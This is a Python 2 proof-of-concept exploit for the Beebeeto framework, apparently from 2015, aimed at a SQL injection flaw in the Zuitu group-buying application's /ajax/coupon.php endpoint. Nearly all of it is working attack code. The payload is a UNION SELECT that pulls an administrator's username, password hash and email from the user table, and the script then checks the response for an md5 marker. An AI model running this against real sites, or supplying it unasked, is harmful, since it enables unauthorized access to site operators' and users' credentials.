#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0051',
            'name': '最土团购 /ajax/coupon.php SQL注入漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2015-03-06',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '最土团购',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['最土团购漏洞', 'SQL注入漏洞', '/ajax/coupon.php', 'php'],
            'desc': 'N/A',
            'references': [
                'http://wooyun.org/bugs/wooyun-2014-075525',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/"
                   "**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,username,0x3a,"
                   "password,0x3a,email,md5(233)),8,9,10,11,9999999999,13,14,15,16/**/from/"
                   "**/user/**/where/**/manager=0x59/**/limit/**/0,1%23")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if 'e165421110ba03099a1c0393373c5b43' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())